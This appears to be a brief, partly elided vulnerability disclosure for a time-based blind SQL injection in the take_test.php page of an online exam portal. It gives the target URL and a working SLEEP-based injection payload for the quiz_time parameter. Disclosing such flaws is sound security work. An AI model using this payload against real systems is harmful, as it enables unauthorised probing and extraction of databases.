# Exploit Title: Engineers Online Portal – SQL Injection in take_test.php (`http://localhost/niamunozmonitoringsystem/take_test.php?quiz_time=1`)
...
- **URL:** `http://localhost/niamunozmonitoringsystem/take_test.php?quiz_time=1`
- **HTTP Method:** GET
...
- **Type:** time-based blind
  ...
  - **Payload:** `quiz_time=1' AND (SELECT 5229 FROM (SELECT(SLEEP(5)))SDpn) AND 'UBZK'='UBZK`
...
1. Browse to `http://localhost/niamunozmonitoringsystem/take_test.php?quiz_time=1`.  
